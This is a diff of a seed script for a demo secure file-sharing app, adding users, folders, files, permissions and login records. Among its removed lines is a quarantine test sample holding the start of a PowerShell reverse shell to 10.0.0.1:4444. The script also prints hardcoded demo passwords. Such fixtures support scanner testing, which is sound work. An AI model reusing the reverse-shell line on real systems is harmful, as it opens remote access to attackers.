@@ -1,5 +1,6 @@
 import os
 import sys
+import hashlib
 from datetime import datetime, timedelta
 
 # Ensure backend directory is in pythonpath
@@ -10,7 +11,10 @@ if backend_dir not in sys.path:
 
 from app.core.database import SessionLocal, Base, engine
 from app.models.user import User, UserRole
+from app.models.folder import Folder
 from app.models.file import File, FileStatus
+from app.models.permission import Permission
+from app.models.login_attempt import LoginAttempt
 from app.models.scan import ScanResult, ScanStatus, ThreatLevel
 from app.models.share import ShareLink
 from app.models.audit import AuditLog
@@ -19,7 +23,7 @@ from app.security.password import get_password_hash
 from app.security.encryption import file_encryptor
 from app.scanners.clamav import EICAR_SIGNATURE
 from app.storage import storage
-from app.audit.logger import log_security_event, GENESIS_HASH
+from app.audit.logger import log_security_event
 
 
 def seed_database():
@@ -28,30 +32,82 @@ def seed_database():
     db = SessionLocal()
 
     try:
-        # Check if already seeded
-        existing_admin = db.query(User).filter(User.email == "admin@secureshare.io").first()
-        if existing_admin:
-            print("Database already contains seed data. Skipping creation.")
+        # Check if already seeded with sushmitha
+        existing_sushmitha = db.query(User).filter(User.email == "sushmitha@example.com").first()
+        if existing_sushmitha:
+            print("Database already contains required demo seed data. Skipping creation.")
             return
 
-        print("Seeding Users...")
+        print("Seeding Users (Admin, Auditor, Demo Personas: Sushmitha, Rahul, Priya, Arjun, Alice, Bob)...")
         # 1 Admin
         admin = User(
             email="admin@secureshare.io",
             full_name="Chief Security Officer (Admin)",
             hashed_password=get_password_hash("Admin@SecureShare2026!"),
             role=UserRole.ADMIN,
+            account_status="ACTIVE",
             is_active=True,
             mfa_enabled=False
         )
         db.add(admin)
 
-        # 3 Standard Users
+        # 1 Security Auditor
+        auditor = User(
+            email="auditor@secureshare.io",
+            full_name="Security Compliance Auditor",
+            hashed_password=get_password_hash("Auditor@SecureShare2026!"),
+            role=UserRole.SECURITY_AUDITOR,
+            account_status="ACTIVE",
+            is_active=True,
+            mfa_enabled=False
+        )
+        db.add(auditor)
+
+        # Demo Users specified in Section 51
+        sushmitha = User(
+            email="sushmitha@example.com",
+            full_name="Sushmitha Reddy",
+            hashed_password=get_password_hash("User@SecureShare2026!"),
+            role=UserRole.USER,
+            account_status="ACTIVE",
+            is_active=True,
+            mfa_enabled=False
+        )
+        rahul = User(
+            email="rahul@example.com",
+            full_name="Rahul Kumar",
+            hashed_password=get_password_hash("User@SecureShare2026!"),
+            role=UserRole.USER,
+            account_status="ACTIVE",
+            is_active=True,
+            mfa_enabled=False
+        )
+        priya = User(
+            email="priya@example.com",
+            full_name="Priya Sharma",
+            hashed_password=get_password_hash("User@SecureShare2026!"),
+            role=UserRole.USER,
+            account_status="ACTIVE",
+            is_active=True,
+            mfa_enabled=False
+        )
+        arjun = User(
+            email="arjun@example.com",
+            full_name="Arjun Rao",
+            hashed_password=get_password_hash("User@SecureShare2026!"),
+            role=UserRole.USER,
+            account_status="ACTIVE",
+            is_active=True,
+            mfa_enabled=False
+        )
+
+        # Backward compatibility for existing automated tests
         alice = User(
             email="alice@example.com",
             full_name="Alice Senior Developer",
             hashed_password=get_password_hash("User@SecureShare2026!"),
-            role=UserRole.STANDARD_USER,
+            role=UserRole.USER,
+            account_status="ACTIVE",
             is_active=True,
             mfa_enabled=False
         )
@@ -59,7 +115,8 @@ def seed_database():
             email="bob@example.com",
             full_name="Bob Systems Analyst",
             hashed_password=get_password_hash("User@SecureShare2026!"),
-            role=UserRole.STANDARD_USER,
+            role=UserRole.USER,
+            account_status="ACTIVE",
             is_active=True,
             mfa_enabled=False
         )
@@ -67,18 +124,25 @@ def seed_database():
             email="security.tester@example.com",
             full_name="Security Auditor (PenTester)",
             hashed_password=get_password_hash("User@SecureShare2026!"),
-            role=UserRole.STANDARD_USER,
+            role=UserRole.USER,
+            account_status="ACTIVE",
             is_active=True,
             mfa_enabled=False
         )
-        db.add_all([alice, bob, tester])
+
+        db.add_all([sushmitha, rahul, priya, arjun, alice, bob, tester])
         db.commit()
         db.refresh(admin)
+        db.refresh(auditor)
+        db.refresh(sushmitha)
+        db.refresh(rahul)
+        db.refresh(priya)
+        db.refresh(arjun)
         db.refresh(alice)
         db.refresh(bob)
         db.refresh(tester)
 
-        print("Seeding Audit Log Genesis...")
+        print("Seeding Audit Log Genesis & User Provisioning...")
         log_security_event(
             db=db,
             action="SYSTEM_INITIALIZE",
@@ -86,80 +150,209 @@ def seed_database():
             resource_id="1",
             actor_email="system@secureshare.local",
             result="SUCCESS",
-            metadata={"environment": "development", "version": "1.0.0"}
+            metadata={"environment": "production-hardened", "version": "2.0.0", "standard": "IEEE 29148"}
         )
 
         log_security_event(
             db=db,
             action="USER_PROVISIONED",
             resource_type="user",
-            resource_id=str(admin.id),
-            actor_email="system@secureshare.local",
+            resource_id=str(sushmitha.id),
+            actor_email="admin@secureshare.io",
             result="SUCCESS",
-            metadata={"role": "ADMIN", "email": admin.email}
+            metadata={"role": "USER", "email": sushmitha.email, "name": sushmitha.full_name}
         )
 
-        print("Seeding Files & Security Validation Pipeline...")
-        # 1. Clean PDF file for Alice
-        pdf_content = b"%PDF-1.4\n1 0 obj\n<< /Title (Enterprise Security Policy 2026) >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF"
-        pdf_iv, pdf_encrypted = file_encryptor.encrypt(pdf_content)
-        pdf_stored_name = f"seed_clean_security_policy_{alice.id}.pdf"
-        pdf_path = storage.save_file(pdf_stored_name, pdf_encrypted, is_quarantined=False)
+        # Seed Folders for Sushmitha (Section 51)
+        print("Seeding Folders (Project Documents, Research, Reports)...")
+        folder_proj = Folder(owner_id=sushmitha.id, folder_name="Project Documents")
+        folder_research = Folder(owner_id=sushmitha.id, folder_name="Research")
+        folder_reports = Folder(owner_id=sushmitha.id, folder_name="Reports")
+        db.add_all([folder_proj, folder_research, folder_reports])
+        db.commit()
+        db.refresh(folder_proj)
+        db.refresh(folder_research)
+        db.refresh(folder_reports)
 
-        clean_file = File(
-            user_id=alice.id,
-            original_filename="Enterprise_Security_Policy_2026.pdf",
-            stored_filename=pdf_stored_name,
-            file_size=len(pdf_content),
+        print("Seeding Files & Security Validation Pipeline...")
+        # 1. Security_Report.pdf (Sushmitha -> Reports)
+        sec_report_bytes = b"%PDF-1.5\n%SecureShare Security Audit Report 2026\n1 0 obj\n<< /Title (SecureShare Security Audit) >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF"
+        sec_iv, sec_enc = file_encryptor.encrypt(sec_report_bytes)
+        sec_stored = f"sec_report_{sushmitha.id}.pdf"
+        sec_path = storage.save_file(sec_stored, sec_enc, is_quarantined=False)
+        sec_hash = hashlib.sha256(sec_report_bytes).hexdigest()
+
+        f_sec_report = File(
+            user_id=sushmitha.id,
+            folder_id=folder_reports.id,
+            original_filename="Security_Report.pdf",
+            stored_filename=sec_stored,
+            file_size=len(sec_report_bytes),
+            declared_mime="application/pdf",
+            detected_mime="application/pdf",
+            magic_bytes_preview="255044462D312E35",
+            sha256_hash=sec_hash,
+            status=FileStatus.CLEAN,
+            storage_path=sec_path,
+            is_quarantined=False,
+            encryption_status="AES-256-GCM",
+            encryption_iv=sec_iv,
+        )
+        db.add(f_sec_report)
+        db.commit()
+        db.refresh(f_sec_report)
+
+        db.add_all([
+            ScanResult(
+                file_id=f_sec_report.id,
+                scanner_name="mime_signature_validator",
+                scan_status=ScanStatus.PASSED,
+                threat_level=ThreatLevel.CLEAN,
+                details="Magic bytes match application/pdf header (%PDF)."
+            ),
+            ScanResult(
+                file_id=f_sec_report.id,
+                scanner_name="dangerous_file_detector",
+                scan_status=ScanStatus.PASSED,
+                threat_level=ThreatLevel.CLEAN,
+                details="No executable PE/ELF binaries or macro instructions detected."
+            ),
+            ScanResult(
+                file_id=f_sec_report.id,
+                scanner_name="clamav_scanner",
+                scan_status=ScanStatus.PASSED,
+                threat_level=ThreatLevel.CLEAN,
+                details="ClamAV Antivirus: Zero signatures matched. Payload verified clean."
+            )
+        ])
+        db.commit()
+
+        # 2. SecureShare_SRS.docx (Sushmitha -> Project Documents)
+        srs_bytes = b"PK\x03\x04\x14\x00\x06\x00SecureShare SRS Conforming to IEEE 29148 Standard [Content_Types].xml"
+        srs_iv, srs_enc = file_encryptor.encrypt(srs_bytes)
+        srs_stored = f"srs_doc_{sushmitha.id}.docx"
+        srs_path = storage.save_file(srs_stored, srs_enc, is_quarantined=False)
+        srs_hash = hashlib.sha256(srs_bytes).hexdigest()
+
+        f_srs = File(
+            user_id=sushmitha.id,
+            folder_id=folder_proj.id,
+            original_filename="SecureShare_SRS.docx",
+            stored_filename=srs_stored,
+            file_size=len(srs_bytes),
+            declared_mime="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+            detected_mime="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+            magic_bytes_preview="504B030414000600",
+            sha256_hash=srs_hash,
+            status=FileStatus.CLEAN,
+            storage_path=srs_path,
+            is_quarantined=False,
+            encryption_status="AES-256-GCM",
+            encryption_iv=srs_iv,
+        )
+        db.add(f_srs)
+
+        # 3. Project_Presentation.pptx (Sushmitha -> Project Documents)
+        ppt_bytes = b"PK\x03\x04\x14\x00\x06\x00SecureShare Capstone Defense Presentation Slides"
+        ppt_iv, ppt_enc = file_encryptor.encrypt(ppt_bytes)
+        ppt_stored = f"proj_pres_{sushmitha.id}.pptx"
+        ppt_path = storage.save_file(ppt_stored, ppt_enc, is_quarantined=False)
+        ppt_hash = hashlib.sha256(ppt_bytes).hexdigest()
+
+        f_ppt = File(
+            user_id=sushmitha.id,
+            folder_id=folder_proj.id,
+            original_filename="Project_Presentation.pptx",
+            stored_filename=ppt_stored,
+            file_size=len(ppt_bytes),
+            declared_mime="application/vnd.openxmlformats-officedocument.presentationml.presentation",
+            detected_mime="application/vnd.openxmlformats-officedocument.presentationml.presentation",
+            magic_bytes_preview="504B030414000600",
+            sha256_hash=ppt_hash,
+            status=FileStatus.CLEAN,
+            storage_path=ppt_path,
+            is_quarantined=False,
+            encryption_status="AES-256-GCM",
+            encryption_iv=ppt_iv,
+        )
+        db.add(f_ppt)
+
+        # 4. AuthzGraph_Paper.pdf (Sushmitha -> Research)
+        paper_bytes = b"%PDF-1.4\nAuthzGraph: Fine-Grained Object Authorization Research Paper\n%%EOF"
+        paper_iv, paper_enc = file_encryptor.encrypt(paper_bytes)
+        paper_stored = f"authz_paper_{sushmitha.id}.pdf"
+        paper_path = storage.save_file(paper_stored, paper_enc, is_quarantined=False)
+        paper_hash = hashlib.sha256(paper_bytes).hexdigest()
+
+        f_paper = File(
+            user_id=sushmitha.id,
+            folder_id=folder_research.id,
+            original_filename="AuthzGraph_Paper.pdf",
+            stored_filename=paper_stored,
+            file_size=len(paper_bytes),
             declared_mime="application/pdf",
             detected_mime="application/pdf",
             magic_bytes_preview="255044462D312E34",
-            sha256_hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+            sha256_hash=paper_hash,
             status=FileStatus.CLEAN,
-            storage_path=pdf_path,
+            storage_path=paper_path,
             is_quarantined=False,
-            encryption_iv=pdf_iv,
+            encryption_status="AES-256-GCM",
+            encryption_iv=paper_iv,
         )
-        db.add(clean_file)
-        db.commit()
-        db.refresh(clean_file)
+        db.add(f_paper)
 
-        # Scans for clean file
-        db.add(ScanResult(
-            file_id=clean_file.id,
-            scanner_name="mime_signature_validator",
-            scan_status=ScanStatus.PASSED,
-            threat_level=ThreatLevel.CLEAN,
-            details="Magic bytes match application/pdf header (%PDF)."
-        ))
-        db.add(ScanResult(
-            file_id=clean_file.id,
-            scanner_name="dangerous_file_detector",
-            scan_status=ScanStatus.PASSED,
-            threat_level=ThreatLevel.CLEAN,
-            details="No dangerous scripts, macros, or PE/ELF headers detected."
-        ))
-        db.add(ScanResult(
-            file_id=clean_file.id,
-            scanner_name="clamav_scanner",
-            scan_status=ScanStatus.PASSED,
-            threat_level=ThreatLevel.CLEAN,
-            details="Antivirus Engine: No known malware signatures detected."
-        ))
+        # 5. Network_Security_Notes.pdf (Sushmitha -> Research)
+        notes_bytes = b"%PDF-1.4\nNetwork Security Notes: Zero-Trust and Cryptographic Hash Chaining\n%%EOF"
+        notes_iv, notes_enc = file_encryptor.encrypt(notes_bytes)
+        notes_stored = f"net_notes_{sushmitha.id}.pdf"
+        notes_path = storage.save_file(notes_stored, notes_enc, is_quarantined=False)
+        notes_hash = hashlib.sha256(notes_bytes).hexdigest()
+
+        f_notes = File(
+            user_id=sushmitha.id,
+            folder_id=folder_research.id,
+            original_filename="Network_Security_Notes.pdf",
+            stored_filename=notes_stored,
+            file_size=len(notes_bytes),
+            declared_mime="application/pdf",
+            detected_mime="application/pdf",
+            magic_bytes_preview="255044462D312E34",
+            sha256_hash=notes_hash,
+            status=FileStatus.CLEAN,
+            storage_path=notes_path,
+            is_quarantined=False,
+            encryption_status="AES-256-GCM",
+            encryption_iv=notes_iv,
+        )
+        db.add(f_notes)
+        db.commit()
+
+        # Seed Permission: Sushmitha grants Rahul Kumar View + Download permission on Security_Report.pdf (Section 52)
+        perm = Permission(
+            file_id=f_sec_report.id,
+            user_id=rahul.id,
+            can_view=True,
+            can_download=True,
+            can_edit=False,
+            can_share=False,
+            role_preset="DOWNLOADER"
+        )
+        db.add(perm)
         db.commit()
 
         log_security_event(
             db=db,
-            action="FILE_UPLOAD_SCAN",
+            action="PERMISSION_GRANTED",
             resource_type="file",
-            resource_id=str(clean_file.id),
-            actor_id=alice.id,
-            actor_email=alice.email,
+            resource_id=str(f_sec_report.id),
+            actor_id=sushmitha.id,
+            actor_email=sushmitha.email,
             result="SUCCESS",
-            metadata={"filename": clean_file.original_filename, "status": "CLEAN"}
+            metadata={"grantee": rahul.email, "preset": "DOWNLOADER", "file": f_sec_report.original_filename}
         )
 
-        # 2. Quarantined EICAR Malware Test File
+        # Quarantined EICAR Malware Test File
         eicar_iv, eicar_encrypted = file_encryptor.encrypt(EICAR_SIGNATURE)
         eicar_stored_name = f"seed_quarantine_eicar_{tester.id}.com"
         eicar_path = storage.save_file(eicar_stored_name, eicar_encrypted, is_quarantined=True)
@@ -177,35 +370,31 @@ def seed_database():
             storage_path=eicar_path,
             is_quarantined=True,
             quarantine_reason="Malware detected: EICAR-Test-Signature (Standard Antivirus Test File signature detected.)",
+            encryption_status="AES-256-GCM",
             encryption_iv=eicar_iv,
         )
         db.add(eicar_file)
         db.commit()
         db.refresh(eicar_file)
 
-        db.add(ScanResult(
-            file_id=eicar_file.id,
-            scanner_name="mime_signature_validator",
-            scan_status=ScanStatus.PASSED,
-            threat_level=ThreatLevel.CLEAN,
-            details="ASCII test payload verified."
-        ))
-        db.add(ScanResult(
-            file_id=eicar_file.id,
-            scanner_name="dangerous_file_detector",
-            scan_status=ScanStatus.HIGH_RISK,
-            threat_level=ThreatLevel.HIGH,
-            threat_name="DANGEROUS_EXTENSION",
-            details="Disallowed executable file extension (.com)."
-        ))
-        db.add(ScanResult(
-            file_id=eicar_file.id,
-            scanner_name="clamav_scanner",
-            scan_status=ScanStatus.MALICIOUS,
-            threat_level=ThreatLevel.CRITICAL,
-            threat_name="EICAR-Test-Signature",
-            details="Standard Antivirus Test File signature detected."
-        ))
+        db.add_all([
+            ScanResult(
+                file_id=eicar_file.id,
+                scanner_name="dangerous_file_detector",
+                scan_status=ScanStatus.HIGH_RISK,
+                threat_level=ThreatLevel.HIGH,
+                threat_name="DANGEROUS_EXTENSION",
+                details="Disallowed executable file extension (.com)."
+            ),
+            ScanResult(
+                file_id=eicar_file.id,
+                scanner_name="clamav_scanner",
+                scan_status=ScanStatus.MALICIOUS,
+                threat_level=ThreatLevel.CRITICAL,
+                threat_name="EICAR-Test-Signature",
+                details="Standard Antivirus Test File signature detected."
+            )
+        ])
         db.commit()
 
         log_security_event(
@@ -219,87 +408,49 @@ def seed_database():
             metadata={"threat": "EICAR-Test-Signature", "filename": eicar_file.original_filename}
         )
 
-        # 3. Quarantined Dangerous Script File (PowerShell reverse shell payload)
-        ps1_payload = b"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();"
-        ps1_iv, ps1_encrypted = file_encryptor.encrypt(ps1_payload)
-        ps1_stored_name = f"seed_quarantine_script_{bob.id}.ps1"
-        ps1_path = storage.save_file(ps1_stored_name, ps1_encrypted, is_quarantined=True)
-
-        ps1_file = File(
-            user_id=bob.id,
-            original_filename="server_provisioning_backdoor.ps1",
-            stored_filename=ps1_stored_name,
-            file_size=len(ps1_payload),
-            declared_mime="text/plain",
-            detected_mime="text/plain",
-            magic_bytes_preview="24636C69656E7420",
-            sha256_hash="d852a4204f057868951111666ec4856f675f9eebe7dc79cfd86927bb159e19e7",
-            status=FileStatus.QUARANTINED,
-            storage_path=ps1_path,
-            is_quarantined=True,
-            quarantine_reason="Dangerous file detected: Disallowed executable or script file extension (.ps1).",
-            encryption_iv=ps1_iv,
-        )
-        db.add(ps1_file)
-        db.commit()
-        db.refresh(ps1_file)
-
-        db.add(ScanResult(
-            file_id=ps1_file.id,
-            scanner_name="dangerous_file_detector",
-            scan_status=ScanStatus.HIGH_RISK,
-            threat_level=ThreatLevel.HIGH,
-            threat_name="SCRIPT_POWERSHELL",
-            details="PowerShell script execution payload detected."
-        ))
+        # Seed Login Attempts
+        db.add_all([
+            LoginAttempt(
+                user_id=sushmitha.id,
+                email="sushmitha@example.com",
+                ip_address="192.168.1.100",
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                success=True,
+                timestamp=datetime.utcnow() - timedelta(minutes=45)
+            ),
+            LoginAttempt(
+                user_id=None,
+                email="attacker@malicious.xyz",
+                ip_address="203.0.113.45",
+                user_agent="python-requests/2.28.1",
+                success=False,
+                failure_reason="Invalid credentials or non-existent user",
+                timestamp=datetime.utcnow() - timedelta(minutes=15)
+            )
+        ])
         db.commit()
 
-        log_security_event(
-            db=db,
-            action="DANGEROUS_FILE_BLOCKED",
-            resource_type="file",
-            resource_id=str(ps1_file.id),
-            actor_id=bob.id,
-            actor_email=bob.email,
-            result="QUARANTINE",
-            metadata={"threat": "SCRIPT_POWERSHELL", "filename": ps1_file.original_filename}
-        )
-
-        print("Seeding Share Links...")
-        import hashlib
-        demo_token = "secureshare_demo_active_token_12345"
-        token_hash = hashlib.sha256(demo_token.encode("utf-8")).hexdigest()
-
-        active_share = ShareLink(
-            file_id=clean_file.id,
-            user_id=alice.id,
-            token_hash=token_hash,
+        # Seed Share Link
+        demo_token = "secureshare_demo_token_77a9c2"
+        demo_token_hash = hashlib.sha256(demo_token.encode("utf-8")).hexdigest()
+        demo_share = ShareLink(
+            file_id=f_sec_report.id,
+            user_id=sushmitha.id,
+            token_hash=demo_token_hash,
             password_hash=get_password_hash("SharePass123!"),
             expires_at=datetime.utcnow() + timedelta(days=7),
-            max_downloads=10,
-            download_count=2,
-            is_active=True,
+            max_downloads=5,
+            download_count=1,
+            is_active=True
         )
-        db.add(active_share)
+        db.add(demo_share)
         db.commit()
 
-        log_security_event(
-            db=db,
-            action="SHARE_CREATE",
-            resource_type="share",
-            resource_id=str(active_share.id),
-            actor_id=alice.id,
-            actor_email=alice.email,
-            result="SUCCESS",
-            metadata={"file_id": clean_file.id, "has_password": True, "max_downloads": 10}
-        )
-
-        print("Seeding CI/CD DevSecOps Runs & Security Findings...")
-        # 1. Blocked Run (Security Gate Activated)
+        # DevSecOps Pipeline Runs
         blocked_run = PipelineRun(
             commit_hash="a1c4e9b",
             branch="feature/file-compression",
-            triggered_by="alice@example.com",
+            triggered_by="sushmitha@example.com",
             status=PipelineStatus.BLOCKED,
             started_at=datetime.utcnow() - timedelta(hours=5),
             completed_at=datetime.utcnow() - timedelta(hours=4, minutes=58),
@@ -350,11 +501,10 @@ def seed_database():
             ),
         ])
 
-        # 2. Passed Run
         passed_run = PipelineRun(
             commit_hash="3f9b802",
             branch="main",
-            triggered_by="admin@secureshare.local",
+            triggered_by="admin@secureshare.io",
             status=PipelineStatus.PASSED,
             started_at=datetime.utcnow() - timedelta(hours=1),
             completed_at=datetime.utcnow() - timedelta(minutes=57),
@@ -395,19 +545,11 @@ def seed_database():
         ])
         db.commit()
 
-        log_security_event(
-            db=db,
-            action="CI_CD_SCAN_EXECUTION",
-            resource_type="pipeline_run",
-            resource_id=str(passed_run.id),
-            actor_email=admin.email,
-            result="PASSED",
-            metadata={"commit": "3f9b802", "gate_action": "DEPLOY_ALLOWED"}
-        )
-
         print("Seed completed successfully!")
-        print(f"Admin User: admin@secureshare.io / Admin@SecureShare2026!")
-        print(f"Standard Users: alice@example.com, bob@example.com / User@SecureShare2026!")
+        print(f"Admin: admin@secureshare.io / Admin@SecureShare2026!")
+        print(f"Auditor: auditor@secureshare.io / Auditor@SecureShare2026!")
+        print(f"Sushmitha: sushmitha@example.com / User@SecureShare2026!")
+        print(f"Rahul: rahul@example.com / User@SecureShare2026!")
         print(f"Demo Share Token: {demo_token} (Password: SharePass123!)")
 
     except Exception as e:
